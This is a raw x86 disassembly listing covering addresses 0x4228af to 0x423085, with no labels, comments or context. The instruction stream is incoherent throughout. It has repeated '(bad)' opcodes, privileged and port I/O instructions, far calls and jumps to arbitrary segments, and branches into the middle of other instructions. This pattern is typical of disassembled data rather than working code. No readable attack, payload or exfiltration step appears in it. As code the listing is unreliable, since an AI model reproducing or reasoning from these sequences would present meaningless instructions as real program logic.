  4228af:	fnsetpm(287 only) 
  4228b1:	arpl   si,bx
  4228b3:	pop    ecx
  4228b4:	sbb    DWORD PTR [edx],ebx
  4228b6:	enter  0x822c,0x3f
  4228ba:	imul   esi,DWORD PTR [edi+0x68],0x33d8c175
  4228c1:	or     DWORD PTR [esi+eiz*2+0x6d],esi
  4228c5:	mov    cl,0xa3
  4228c7:	pop    eax
  4228c8:	jae    0x4228f3
  4228ca:	add    eax,0x20f1aafe
  4228d0:	and    ah,al
  4228d2:	push   cs
  4228d3:	and    eax,0x10af8c50
  4228d8:	and    BYTE PTR ds:0x4fda648a,dh
  4228de:	retf   0xfc97
  4228e1:	or     eax,0x87ea0fe0
  4228e6:	shl    BYTE PTR [ecx],1
  4228e8:	int    0x6d
  4228ea:	mov    DWORD PTR [ecx+0x5ab60940],edx
  4228f0:	mov    al,0x11
  4228f2:	cwde   
  4228f3:	add    al,0x77
  4228f5:	xchg   esp,eax
  4228f6:	xor    eax,0xb2cf3d0e
  4228fb:	push   es
  4228fc:	icebp  
  4228fd:	xor    bl,ch
  4228ff:	fnstenv [esi-0x504e3d58]
  422905:	sub    DWORD PTR [esi-0x1e],edi
  422908:	jle    0x4228ff
  42290a:	or     eax,DWORD PTR [edi]
  42290c:	mov    eax,ds:0x7fc801ce
  422911:	cwde   
  422912:	sbb    bl,BYTE PTR [ecx]
  422914:	jbe    0x4228ac
  422916:	add    dl,BYTE PTR [edi+0xc]
  422919:	push   0x52
  42291b:	shr    dh,cl
  42291d:	pop    esp
  42291e:	push   esp
  42291f:	les    ebp,FWORD PTR [ecx-0x3b3ffbdc]
  422925:	int    0x6f
  422927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422928:	dec    ebx
  422929:	scas   eax,DWORD PTR es:[edi]
  42292a:	pop    esp
  42292b:	clc    
  42292c:	ins    DWORD PTR es:[edi],dx
  42292d:	pop    ss
  42292e:	cmp    eax,0x1578905e
  422933:	call   0x1fef:0xeda48994
  42293a:	jnp    0x4228d1
  42293c:	and    al,0xa
  42293e:	mov    eax,0x7d661918
  422943:	mov    ds:0xa0cf6c2b,eax
  422948:	add    DWORD PTR [esi+0x46],esp
  42294b:	ret    
  42294c:	call   0xd6da:0xf51caffd
  422953:	lods   al,BYTE PTR ds:[esi]
  422954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422955:	mov    WORD PTR [esp+edi*4],ss
  422958:	inc    esp
  422959:	ret    
  42295a:	fwait
  42295b:	mov    eax,fs:0xcf9615be
  422961:	sub    eax,0x188854f8
  422966:	adc    DWORD PTR [ecx+0x25],ebp
  422969:	mov    cs,esp
  42296b:	iret   
  42296c:	or     al,0xc8
  42296e:	cmp    DWORD PTR [ebp+edi*4+0x62],eax
  422972:	mov    edi,0x546a30e2
  422977:	dec    ecx
  422978:	dec    eax
  422979:	(bad)  
  42297d:	adc    BYTE PTR [edx],al
  42297f:	jo     0x422978
  422981:	xchg   ebx,eax
  422982:	ret    
  422983:	stos   DWORD PTR es:[edi],eax
  422984:	das    
  422985:	arpl   WORD PTR [eax+0x54],cx
  422988:	retf   0xa9ce
  42298b:	nop
  42298c:	xchg   DWORD PTR [esi-0x1fe53cea],edi
  422992:	(bad)  
  422993:	push   eax
  422994:	xor    eax,0x8110cd45
  422999:	xor    al,0x85
  42299b:	push   edx
  42299c:	add    BYTE PTR [edx+0x77],0x1f
  4229a0:	ror    DWORD PTR [eax+0x74b57dc6],1
  4229a6:	daa    
  4229a7:	(bad)  
  4229a8:	push   ebp
  4229a9:	sbb    DWORD PTR [eax+esi*8+0x6e631861],0x398a7def
  4229b4:	ins    DWORD PTR es:[edi],dx
  4229b5:	int3   
  4229b6:	or     DWORD PTR [esi],edi
  4229b8:	gs pop edi
  4229ba:	cdq    
  4229bb:	lods   eax,DWORD PTR ds:[esi]
  4229bc:	test   DWORD PTR [ebx+0x7],ebp
  4229bf:	cmp    ebx,DWORD PTR [ebx]
  4229c1:	ficom  DWORD PTR ds:0x8d5cf03a
  4229c7:	push   ds
  4229c8:	mov    ss,ecx
  4229ca:	retf   0x5ab
  4229cd:	(bad)  
  4229cf:	lods   al,BYTE PTR ds:[esi]
  4229d0:	aad    0x50
  4229d2:	sar    DWORD PTR [ecx-0x1c],cl
  4229d5:	je     0x4229b4
  4229d7:	test   al,0xd8
  4229d9:	mov    edi,0xc7115813
  4229de:	mov    ebp,0x35db867f
  4229e3:	stos   BYTE PTR es:[edi],al
  4229e4:	inc    edx
  4229e5:	xchg   esi,eax
  4229e6:	inc    edx
  4229e7:	rcl    ebp,0x75
  4229ea:	xor    DWORD PTR [ecx+0x71],ecx
  4229ed:	add    BYTE PTR [edi+0x8],dl
  4229f0:	adc    ebx,DWORD PTR [ebx+0xd94d3de]
  4229f6:	mov    ebp,DWORD PTR [eax]
  4229f8:	jle    0x422a73
  4229fa:	fisttp QWORD PTR [ebp-0x399ab5bf]
  422a01:	sbb    DWORD PTR [eax-0x1f],eax
  422a04:	sub    BYTE PTR [edx+0x4eb82528],al
  422a0a:	mov    al,ds:0x1ff7122a
  422a0f:	push   0x32
  422a11:	xchg   edx,eax
  422a12:	mov    ecx,0x179bbb8d
  422a17:	or     eax,0xa41b72a9
  422a1c:	inc    edi
  422a1d:	rol    ebp,0xe9
  422a20:	mov    cs,WORD PTR [edx]
  422a22:	mov    edi,0x68686e6f
  422a27:	stc    
  422a28:	mov    ds:0xf7084ae0,al
  422a2d:	ja     0x422a79
  422a2f:	dec    edx
  422a31:	cmp    eax,0x2e8eedf7
  422a36:	dec    eax
  422a37:	sbb    ch,bh
  422a39:	sbb    DWORD PTR [edi+eax*4-0x17fffe4f],0x1
  422a41:	add    BYTE PTR [eax],al
  422a43:	cmp    DWORD PTR ds:0xca2d54e8,0xffffffc3
  422a4a:	les    edi,FWORD PTR [ebp-0x23]
  422a4d:	push   ecx
  422a4e:	add    ebp,DWORD PTR cs:[eax+0x2c18592b]
  422a55:	lods   eax,DWORD PTR ds:[esi]
  422a56:	push   0x6c
  422a58:	sbb    DWORD PTR [esi],esp
  422a5a:	das    
  422a5b:	loopne 0x422a1a
  422a5d:	mov    edi,0x86c0038a
  422a62:	xor    BYTE PTR [eax-0x6a],0x47
  422a66:	sbb    ecx,DWORD PTR [ecx+0x487854b]
  422a6c:	or     al,0x29
  422a6e:	mov    al,BYTE PTR [ebx-0x116a71ed]
  422a74:	mov    ebp,0x12a7b5f7
  422a79:	lahf   
  422a7a:	arpl   WORD PTR [ebx-0x7e],dx
  422a7d:	icebp  
  422a7e:	iret   
  422a7f:	xchg   BYTE PTR [esi+0x68],al
  422a82:	or     al,0x2c
  422a84:	jne    0x422a3f
  422a86:	(bad)  
  422a87:	xor    al,BYTE PTR [edi]
  422a89:	and    cl,BYTE PTR [eax+0x36cae5d3]
  422a8f:	adc    ch,dh
  422a91:	xor    eax,0xda5b0040
  422a96:	push   ebp
  422a97:	mov    esp,0xd632b19e
  422a9c:	lods   al,BYTE PTR ds:[esi]
  422a9d:	stc    
  422a9e:	and    ch,BYTE PTR [eax]
  422aa0:	fdiv   QWORD PTR [ebp+0x68]
  422aa3:	mov    ds:0xa081c045,eax
  422aa8:	imul   esi,DWORD PTR ds:0x163ea05b,0xffffffcc
  422aaf:	mov    edi,0x96156168
  422ab4:	popa   
  422ab5:	lods   al,BYTE PTR ds:[esi]
  422ab6:	pop    esi
  422ab7:	dec    ebx
  422ab8:	inc    ecx
  422ab9:	out    0xad,eax
  422abb:	mov    dl,0x47
  422abd:	in     eax,dx
  422abe:	mov    bh,0xdc
  422ac0:	jmp    0x26bcbe01
  422ac5:	sub    DWORD PTR [esi-0x8c066b6],esp
  422acb:	or     eax,DWORD PTR [ebx+0x2bc619f0]
  422ad1:	fadd   DWORD PTR [eax-0x2f]
  422ad4:	push   cs
  422ad5:	ss sbb esi,ebx
  422ad8:	scas   eax,DWORD PTR es:[edi]
  422ad9:	lea    ebx,[bp+si+0xd23]
  422ade:	jle    0x422ad9
  422ae0:	mov    ds:0xeed3e913,eax
  422ae5:	mov    ah,0xd3
  422ae7:	cmp    eax,0x2eda45a3
  422aec:	push   ecx
  422aed:	outs   dx,DWORD PTR ds:[esi]
  422aee:	leave  
  422aef:	xchg   esi,eax
  422af0:	lods   eax,DWORD PTR ds:[esi]
  422af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422af2:	sbb    DWORD PTR [edx-0x4141b134],esi
  422af8:	and    al,0xde
  422afa:	lea    eax,[esi+esi*2-0x22]
  422afe:	scas   eax,DWORD PTR es:[edi]
  422aff:	adc    esp,DWORD PTR [ecx+0x70896f26]
  422b05:	sbb    DWORD PTR [ebx-0x72],esi
  422b08:	push   esp
  422b09:	cs daa 
  422b0b:	xchg   esp,eax
  422b0c:	lock js 0x422b42
  422b0f:	test   eax,0x7355e3ed
  422b14:	push   0x43
  422b16:	or     eax,0xeaf011f3
  422b1b:	aaa    
  422b1c:	add    esi,eax
  422b1e:	xlat   BYTE PTR ds:[ebx]
  422b1f:	jmp    0x9970c9c0
  422b24:	adc    ecx,DWORD PTR [edx]
  422b26:	int3   
  422b27:	sbb    eax,ecx
  422b29:	inc    ebp
  422b2a:	rcl    DWORD PTR [ebx+ebp*1],0x8d
  422b2e:	xor    eax,0x31195f55
  422b33:	xchg   ebx,eax
  422b34:	rcl    BYTE PTR [edi+eax*4-0x4],0x7a
  422b39:	sbb    ch,BYTE PTR fs:[edx+0x26]
  422b3d:	or     al,0xe2
  422b3f:	in     al,0x37
  422b41:	dec    esi
  422b42:	or     DWORD PTR [ebp-0x3e],0x13e34cdc
  422b49:	mov    eax,ds:0x35c524b3
  422b4e:	jmp    0x422b4a
  422b50:	imul   ebx,DWORD PTR ds:0x17016e17,0xffffffa4
  422b57:	imul   edi
  422b59:	shl    BYTE PTR [ebp-0x489aa4b2],0x72
  422b60:	lds    esp,FWORD PTR [eax-0x37]
  422b63:	ds sti 
  422b65:	cmp    BYTE PTR [esi],al
  422b67:	xchg   edx,eax
  422b68:	loope  0x422b30
  422b6a:	push   cs
  422b6b:	(bad)  
  422b6d:	retf   
  422b6e:	enter  0x3b3f,0x96
  422b72:	es jns 0x422b80
  422b75:	out    dx,al
  422b76:	jmp    0x422ba4
  422b78:	pop    edx
  422b79:	inc    esp
  422b7a:	cwde   
  422b7b:	leave  
  422b7c:	add    BYTE PTR [eax],dh
  422b7e:	addr16 (bad) 
  422b80:	push   es
  422b81:	adc    dh,BYTE PTR [ebp-0x2ca09dc1]
  422b87:	dec    ecx
  422b88:	cdq    
  422b89:	xor    ah,al
  422b8b:	aad    0xe2
  422b8d:	loope  0x422b65
  422b8f:	loope  0x422b95
  422b91:	into   
  422b92:	mov    edx,0x43fd2356
  422b97:	jle    0x422b43
  422b99:	leave  
  422b9a:	(bad)  
  422b9b:	xchg   ebp,eax
  422b9c:	out    0x17,al
  422b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b9f:	pop    es
  422ba0:	mov    edi,0x1f464b4b
  422ba5:	push   esp
  422ba6:	mov    ds:0x2f5fb204,eax
  422bab:	aaa    
  422bac:	xchg   ebp,eax
  422bad:	mov    ds:0xa3ba054b,eax
  422bb2:	push   ss
  422bb3:	cmp    al,0xaa
  422bb5:	pop    ss
  422bb6:	dec    ecx
  422bb7:	xchg   edi,eax
  422bb8:	push   esi
  422bb9:	mov    bh,0xc0
  422bbb:	mov    eax,0x602b502a
  422bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bc1:	hlt    
  422bc2:	int    0xb6
  422bc4:	mov    eax,ds:0x35501a8b
  422bc9:	pop    edx
  422bca:	push   0xffffffc1
  422bcc:	inc    eax
  422bcd:	jbe    0x422bf9
  422bcf:	pop    edx
  422bd0:	add    eax,0x50b2be07
  422bd5:	mov    dh,0xd9
  422bd7:	jmp    0x391b18a3
  422bdc:	aaa    
  422bdd:	pop    ds
  422bde:	cmc    
  422bdf:	mov    eax,0xb50f346c
  422be4:	dec    esp
  422be5:	pop    ebp
  422be6:	or     dl,BYTE PTR [eiz*2-0x74b4cc20]
  422bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bee:	rol    ebp,0xc
  422bf1:	add    eax,0xb7eed655
  422bf6:	cmc    
  422bf7:	mov    eax,0x81c0318e
  422bfc:	ror    DWORD PTR [ebx-0x126e2e0b],1
  422c02:	aam    0x19
  422c04:	dec    ecx
  422c05:	scas   eax,DWORD PTR es:[edi]
  422c06:	shl    DWORD PTR [esi+0x20],cl
  422c09:	sahf   
  422c0a:	jmp    0x422bb6
  422c0c:	cwde   
  422c0d:	xor    al,0xf3
  422c0f:	jns    0x422bcb
  422c11:	out    dx,eax
  422c12:	out    0x93,al
  422c14:	add    edx,ecx
  422c16:	mov    BYTE PTR [eax+ecx*8+0x1fa6c7ac],cl
  422c1d:	inc    ebx
  422c1e:	pop    es
  422c1f:	lahf   
  422c20:	iret   
  422c21:	jg     0x422bb4
  422c23:	test   al,0x71
  422c25:	add    al,0x8c
  422c27:	call   0x6863:0x3670468b
  422c2e:	lock jge 0x422c2c
  422c31:	mov    esi,0x8c7853e7
  422c36:	daa    
  422c37:	retf   
  422c38:	imul   edx,DWORD PTR [ecx],0xffffff91
  422c3b:	outs   dx,DWORD PTR ds:[esi]
  422c3c:	mov    bl,0x1
  422c3e:	add    al,ch
  422c40:	add    DWORD PTR [eax],eax
  422c42:	add    BYTE PTR [ebp+eiz*4-0x5eb845d3],al
  422c49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c4a:	jg     0x422c68
  422c4c:	lds    esp,FWORD PTR ds:0xd6c1c5e6
  422c52:	push   0xfc2c677
  422c57:	dec    ecx
  422c58:	das    
  422c59:	jge    0x422cc8
  422c5b:	pop    esp
  422c5d:	inc    ebp
  422c5e:	imul   ebx,ecx,0x73b1e367
  422c64:	pop    es
  422c65:	shr    DWORD PTR [ebx+0x10],0x27
  422c69:	jge    0x422c81
  422c6b:	adc    ebx,DWORD PTR [eax-0x6e186558]
  422c71:	sub    dl,dh
  422c73:	jmp    esp
  422c75:	(bad)
  422c79:	sbb    eax,0xafc043db
  422c7e:	and    eax,DWORD PTR [ebp+0x69]
  422c81:	test   al,0xf0
  422c83:	loop   0x422c45
  422c85:	retf   
  422c86:	sub    ah,BYTE PTR [edx+0x6e]
  422c89:	call   FWORD PTR [edx+0x1dad52bd]
  422c8f:	loop   0x422cfe
  422c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c92:	push   ebx
  422c93:	les    edi,FWORD PTR [edi+0x5836e693]
  422c99:	xchg   ebx,eax
  422c9a:	clc    
  422c9b:	adc    eax,0xb3e3fc4f
  422ca0:	push   ebx
  422ca1:	xor    cl,BYTE PTR [ebx]
  422ca3:	std    
  422ca4:	dec    esi
  422ca5:	sbb    ah,BYTE PTR [edi-0x1c2dea5b]
  422cab:	iret   
  422cac:	ror    BYTE PTR [edx+0xa],cl
  422caf:	inc    ebp
  422cb0:	cmp    BYTE PTR [edx+eiz*2-0x6],0x5c
  422cb5:	enter  0xa182,0xeb
  422cb9:	icebp  
  422cba:	pusha  
  422cbb:	mov    ds:0xab83da1a,al
  422cc0:	pop    ebx
  422cc1:	xor    al,0x94
  422cc3:	pop    edx
  422cc4:	adc    DWORD PTR [eax+eax*1-0x1c],esi
  422cc8:	jle    0x422cc8
  422cca:	jno    0x422cf9
  422ccc:	xchg   DWORD PTR [eax],edi
  422cce:	inc    ebp
  422ccf:	mov    BYTE PTR [esi-0x3d3ba717],bh
  422cd5:	repz ds in eax,0xc5
  422cd9:	cdq    
  422cda:	mov    dh,0x5d
  422cdc:	call   0x7f8a:0x4f775987
  422ce3:	xor    DWORD PTR [ebp-0x52a7318f],0x1b
  422cea:	test   DWORD PTR [edi-0xe3ddd3a],edi
  422cf0:	inc    ecx
  422cf1:	xor    ebp,DWORD PTR [ebp+edi*8-0x17]
  422cf5:	and    eax,0x71f024d6
  422cfa:	scas   al,BYTE PTR es:[edi]
  422cfb:	sub    eax,0xc2233516
  422d00:	shl    esi,cl
  422d02:	lods   al,BYTE PTR ds:[esi]
  422d03:	mov    esi,0x547dc289
  422d08:	out    dx,al
  422d09:	pop    ss
  422d0a:	xor    esp,eax
  422d0c:	jmp    0x33cc:0x35582363
  422d13:	imul   eax,DWORD PTR fs:[ebp+0x2f466f1f],0xffffffb2
  422d1b:	adc    al,0x25
  422d1d:	jb     0x422cf1
  422d1f:	fcmovnbe st,st(7)
  422d21:	imul   edi,DWORD PTR [ebx+0xd9b8ac6],0x64
  422d28:	enter  0xf089,0x27
  422d2c:	push   es
  422d2d:	bound  edx,QWORD PTR [edi]
  422d2f:	(bad)  
  422d30:	hlt    
  422d31:	add    al,0xaf
  422d33:	fs inc ebx
  422d35:	jge    0x422cc0
  422d37:	rcl    BYTE PTR [edx+0x7],1
  422d3a:	add    bl,0x35
  422d3d:	and    esi,ecx
  422d3f:	push   0x35fefa02
  422d44:	or     BYTE PTR [ecx-0x742529ea],al
  422d4a:	cwde   
  422d4b:	sub    al,0xbb
  422d4d:	imul   edx,DWORD PTR [ebp-0x6b9193c5],0xf0d31933
  422d57:	cdq    
  422d58:	out    dx,eax
  422d59:	sbb    dh,bl
  422d5b:	jg     0x422d5f
  422d5d:	je     0x422d12
  422d5f:	adc    edx,DWORD PTR [edi+0x68]
  422d62:	and    eax,edx
  422d64:	push   ss
  422d65:	call   0x9ea4f609
  422d6a:	mov    bl,0xf0
  422d6c:	div    BYTE PTR [ebx-0x33]
  422d6f:	push   ebx
  422d70:	iret   
  422d71:	loopne 0x422d4a
  422d73:	xchg   esp,eax
  422d74:	mov    eax,ds:0xec6142e8
  422d79:	inc    esi
  422d7a:	mov    WORD PTR [eax-0x3d],cs
  422d7d:	repnz mov WORD PTR [ebx],?
  422d80:	out    dx,al
  422d81:	or     ecx,esi
  422d83:	loopne 0x422d1d
  422d85:	nop
  422d86:	std    
  422d87:	sbb    BYTE PTR [eax],bh
  422d89:	inc    ebp
  422d8a:	jno    0x422da9
  422d8c:	lahf   
  422d8d:	cmp    ebx,DWORD PTR [ebp+0x1f]
  422d90:	inc    edx
  422d91:	jbe    0x422e04
  422d93:	jne    0x422dfa
  422d95:	adc    bh,BYTE PTR [esi*2+0x5186556]
  422d9c:	iret   
  422d9d:	mov    ch,0x39
  422d9f:	and    bh,BYTE PTR [edx+0x249861f7]
  422da5:	add    al,dl
  422da7:	adc    BYTE PTR [ecx-0x24],al
  422daa:	bound  esi,QWORD PTR [edi]
  422dac:	pop    ebp
  422dad:	ja     0x422d54
  422daf:	std    
  422db0:	push   ss
  422db1:	mov    edi,0xf6902742
  422db6:	sar    BYTE PTR [eax],cl
  422db8:	mov    ch,0xf3
  422dba:	sbb    BYTE PTR [edi],bl
  422dbc:	lods   eax,DWORD PTR ds:[esi]
  422dbd:	nop
  422dbe:	or     BYTE PTR [edx+0x4a],al
  422dc1:	fmul   DWORD PTR [edi]
  422dc3:	mov    cs:0x2daace96,al
  422dc9:	punpcklwd mm0,mm3
  422dcc:	sub    eax,edx
  422dce:	ins    DWORD PTR es:[edi],dx
  422dcf:	xor    al,0xb2
  422dd1:	jbe    0x422db9
  422dd3:	sti    
  422dd4:	icebp  
  422dd5:	xlat   BYTE PTR ds:[ebx]
  422dd6:	jl     0x422e02
  422dd8:	jae    0x422e16
  422dda:	push   ds
  422ddb:	test   cl,bl
  422ddd:	retf   0x4e50
  422de0:	adc    BYTE PTR [esi-0x163b1593],bl
  422de6:	clc    
  422de7:	or     BYTE PTR [edi+0x57],dh
  422dea:	mov    ds:0x9b3d2759,al
  422def:	test   BYTE PTR [esi+edi*1-0x2c],ch
  422df3:	xchg   ebp,eax
  422df4:	sub    al,0xd1
  422df6:	cmp    BYTE PTR [eax+0x5d],0x5
  422dfa:	pusha  
  422dfb:	test   esp,ebp
  422dfd:	lea    esi,[ecx+0xa7a5af9]
  422e03:	or     al,0x2b
  422e05:	es mov dl,0x26
  422e08:	lahf   
  422e09:	add    DWORD PTR [edi+edx*1+0x42],esp
  422e0d:	cli    
  422e0e:	sti    
  422e0f:	push   ecx
  422e10:	sub    eax,ebp
  422e12:	push   edx
  422e13:	out    0x99,eax
  422e15:	sbb    DWORD PTR [esi+0x8],esi
  422e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e19:	jno    0x422e8b
  422e1b:	cli    
  422e1c:	add    eax,DWORD PTR [edx+eax*1+0x5f]
  422e20:	and    edx,DWORD PTR [edx+0x44f69994]
  422e26:	inc    esi
  422e27:	ins    DWORD PTR es:[edi],dx
  422e28:	sbb    DWORD PTR [eax+0x1c],edi
  422e2b:	daa    
  422e2c:	ss lahf 
  422e2e:	xor    DWORD PTR [edi+0x1536afb9],ebx
  422e34:	and    eax,0x5a2f075b
  422e39:	rol    DWORD PTR [edi],1
  422e3b:	(bad)  
  422e3c:	fld    DWORD PTR [ecx]
  422e3e:	add    al,ch
  422e40:	add    DWORD PTR [eax],eax
  422e42:	add    BYTE PTR [edi],dl
  422e44:	sub    DWORD PTR [edx],edx
  422e46:	cmc    
  422e47:	hlt    
  422e48:	int    0xac
  422e4a:	or     bh,bl
  422e4c:	push   edi
  422e4d:	mov    edi,0x24bef05d
  422e52:	ds out 0xae,al
  422e55:	push   0x98440c2
  422e5a:	aad    0xa2
  422e5c:	rcl    BYTE PTR ds:[edi],1
  422e5f:	inc    ebx
  422e60:	jp     0x422ec7
  422e62:	xor    eax,0xf5ed27e
  422e67:	add    al,0xfb
  422e69:	pop    ecx
  422e6a:	push   0x33
  422e6c:	mov    ds:0xd3b734c2,eax
  422e71:	or     eax,0x66e41100
  422e76:	push   cs
  422e77:	pop    ds
  422e78:	fwait
  422e79:	daa    
  422e7a:	das    
  422e7b:	adc    eax,0xa1c0b62b
  422e80:	xchg   esi,eax
  422e81:	mov    ds,WORD PTR [ecx+ecx*4]
  422e84:	xchg   edx,eax
  422e85:	adc    DWORD PTR [edx],edi
  422e87:	test   DWORD PTR [esi],edi
  422e89:	iret   
  422e8a:	pop    ds
  422e8b:	pop    eax
  422e8c:	dec    esp
  422e8d:	mov    dl,BYTE PTR [edi]
  422e8f:	add    al,0xb4
  422e91:	and    al,0xef
  422e93:	sbb    DWORD PTR [ecx+0x6b],edi
  422e96:	mov    ds:0x64c25827,al
  422e9b:	popa   
  422e9c:	add    ah,BYTE PTR [esi-0x4b]
  422e9f:	imul   ebx,DWORD PTR [eax+0x65],0x29
  422ea3:	(bad)  
  422ea4:	lea    esp,[ebx+esi*4]
  422ea7:	pop    esi
  422ea8:	rcl    edi,1
  422eaa:	mov    al,0x87
  422eac:	outs   dx,DWORD PTR ds:[esi]
  422ead:	jne    0x422e77
  422eaf:	jb     0x422ec0
  422eb1:	push   0xffffffc3
  422eb3:	jecxz  0x422e70
  422eb5:	cwde   
  422eb6:	popa   
  422eb7:	shr    DWORD PTR [ecx],1
  422eb9:	je     0x422ec6
  422ebb:	ror    DWORD PTR [ebp+0x45],0x4f
  422ebf:	push   ebp
  422ec0:	or     eax,0xcbb7cf28
  422ec5:	inc    ebx
  422ec6:	ror    BYTE PTR [ebp+eiz*8+0x718fec08],1
  422ecd:	fiadd  DWORD PTR [ebp-0xb]
  422ed0:	jg     0x422f3f
  422ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ed3:	or     ecx,ebp
  422ed5:	sub    BYTE PTR [ecx+ebp*2+0x5d],0x8e
  422eda:	cmp    edi,DWORD PTR [esi+0x58]
  422edd:	lahf   
  422ede:	jmp    0xd768:0xfb346778
  422ee5:	bound  esi,QWORD PTR [ecx-0x5cb84e3b]
  422eeb:	aas    
  422eec:	loopne 0x422e73
  422eee:	push   ss
  422eef:	and    dh,ch
  422ef1:	pop    esp
  422ef2:	fwait
  422ef3:	mov    ecx,DWORD PTR [eax-0x34]
  422ef6:	sbb    ah,dh
  422ef8:	dec    edi
  422ef9:	mov    al,ds:0xae718bb9
  422efe:	xchg   edi,eax
  422eff:	jge    0x422ed1
  422f01:	sahf   
  422f02:	mov    WORD PTR [eax-0x61],?
  422f05:	mov    eax,0x10a3e2db
  422f0a:	and    ecx,edi
  422f0c:	(bad)  
  422f0d:	in     al,dx
  422f0e:	mov    ebp,0x1df5e5ff
  422f13:	adc    ecx,DWORD PTR [edx+0x66c085d9]
  422f19:	xchg   ebx,eax
  422f1a:	(bad)  
  422f1b:	cmp    eax,0x7e6137ea
  422f20:	out    0x9a,eax
  422f22:	sbb    BYTE PTR [ebx-0x46],bh
  422f25:	jnp    0x422f37
  422f27:	push   cs
  422f28:	xchg   ebp,eax
  422f29:	dec    esi
  422f2b:	in     al,dx
  422f2c:	pop    ebp
  422f2d:	add    DWORD PTR [esi+0xc],ecx
  422f30:	pop    ds
  422f31:	push   cs
  422f32:	and    DWORD PTR [ecx],edi
  422f34:	mov    edi,0xbf17a1c1
  422f39:	(bad)  
  422f3a:	jl     0x422f1e
  422f3c:	adc    DWORD PTR [edx],ebp
  422f3e:	gs daa 
  422f40:	test   BYTE PTR ds:0xd8ee40ec,dh
  422f46:	pop    esp
  422f47:	sbb    DWORD PTR [ebx],edi
  422f49:	cmp    eax,0xbb562e10
  422f4e:	mov    bh,cl
  422f50:	sbb    al,0x26
  422f52:	cmp    al,0xca
  422f54:	mov    esi,0x53fe8184
  422f59:	js     0x422f17
  422f5b:	pop    edx
  422f5c:	sahf   
  422f5d:	fst    DWORD PTR [ebp+0x77]
  422f60:	in     eax,0x82
  422f62:	jns    0x422eec
  422f64:	cmc    
  422f65:	dec    edi
  422f66:	inc    esi
  422f67:	xchg   DWORD PTR [ecx+0x262bbf6e],edi
  422f6d:	mov    BYTE PTR [edi+0x384cf19b],dh
  422f73:	mov    esi,0x4131e8a4
  422f78:	add    BYTE PTR [edx-0x7060f394],al
  422f7e:	call   FWORD PTR [esi]
  422f80:	inc    BYTE PTR [esp]
  422f83:	test   al,0x6e
  422f85:	cs jecxz 0x422fb1
  422f88:	jmp    0xe95f:0x557bf4ed
  422f8f:	aas    
  422f90:	daa    
  422f91:	xchg   BYTE PTR [eax+0x22],dh
  422f94:	pushf  
  422f95:	xchg   edi,eax
  422f96:	sti    
  422f97:	sub    BYTE PTR ds:[ecx],cl
  422f9a:	cmp    dl,BYTE PTR [ecx]
  422f9c:	jbe    0x422f4e
  422f9e:	into   
  422f9f:	syscall 
  422fa1:	pop    ds
  422fa2:	adc    al,0x5d
  422fa4:	js     0x422f47
  422fa6:	or     BYTE PTR [edx-0x4f],bl
  422fa9:	mov    ebx,0x294522b9
  422fae:	mov    al,0x81
  422fb0:	mov    bl,0x41
  422fb2:	cmp    bl,bh
  422fb4:	mov    ebp,ebp
  422fb6:	pop    eax
  422fb7:	mov    BYTE PTR [edx+0x55d5c51a],bh
  422fbd:	sar    BYTE PTR [edi-0x80],1
  422fc0:	bound  esp,QWORD PTR [ecx]
  422fc2:	(bad)  
  422fc3:	pop    ss
  422fc4:	iret   
  422fc5:	push   ss
  422fc6:	mov    ebp,0x431c3c6f
  422fcb:	push   edi
  422fcd:	or     BYTE PTR [esi+edx*8+0x2b],dh
  422fd1:	ss inc eax
  422fd3:	ret    
  422fd4:	test   al,0x10
  422fd6:	clc    
  422fd7:	or     edx,edx
  422fd9:	loopne 0x423006
  422fdb:	mov    dl,0x48
  422fdd:	popa   
  422fde:	mov    edi,0x89e9c699
  422fe3:	xor    edi,DWORD PTR [eax-0x655e5685]
  422fe9:	sar    al,0x46
  422fec:	pop    esp
  422fed:	and    ch,0x2
  422ff0:	aaa    
  422ff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ff2:	mov    ch,0x7d
  422ff4:	sub    cl,BYTE PTR [ebx+0x45]
  422ff7:	dec    eax
  422ff8:	cli    
  422ff9:	test   eax,0xfe1d46e1
  422ffe:	jmp    0x2d89:0xb50fed77
  423005:	mov    al,0x54
  423007:	lods   eax,DWORD PTR ds:[esi]
  423008:	and    eax,0x483c4219
  42300d:	xchg   BYTE PTR [ebp+0x25],ah
  423010:	mov    edi,0x7e894dd9
  423015:	adc    edi,DWORD PTR [edi-0x1c]
  423018:	test   al,0xf
  42301a:	add    al,BYTE PTR [ebp-0x62]
  42301d:	imul   ebp,DWORD PTR [esi-0x385cffbd],0xc0ce4b59
  423027:	ins    DWORD PTR es:[edi],dx
  423028:	add    BYTE PTR [edx-0x76],cl
  42302b:	aaa    
  42302c:	(bad)  
  42302d:	out    0xc2,eax
  42302f:	mul    ebx
  423031:	aaa    
  423032:	cmc    
  423033:	xchg   ecx,eax
  423034:	call   0x4468:0xb67feef4
  42303b:	ja     0x423018
  42303d:	add    DWORD PTR [eax],eax
  42303f:	call   0x68423045
  423044:	ret    
  423045:	push   edi
  423046:	fnstcw WORD PTR [esi]
  423048:	cmc    
  423049:	jmp    0x42302b
  42304b:	stc    
  42304c:	jge    0x423000
  42304e:	imul   edx,esp,0x8ddcb923
  423054:	and    al,0xff
  423056:	push   ss
  423057:	int    0x38
  423059:	pop    esi
  42305a:	sbb    eax,0xeebe65e5
  42305f:	ds pop ebx
  423061:	adc    eax,0x84900675
  423066:	and    ebp,DWORD PTR [eax-0x8]
  423069:	add    al,0xce
  42306b:	hlt    
  42306c:	mov    esp,0x9a1c9ab1
  423071:	rol    DWORD PTR [esi+0x1d],0x4
  423075:	test   BYTE PTR [eax],dh
  423077:	push   ebp
  423078:	aas    
  423079:	sub    ch,al
  42307b:	das    
  42307c:	in     eax,dx
  42307d:	xor    BYTE PTR [edi],ah
  42307f:	test   BYTE PTR [ecx+0x74],dl
  423082:	pop    edx
  423083:	(bad)  
  423084:	dec    esi
  423085:	pop    ecx
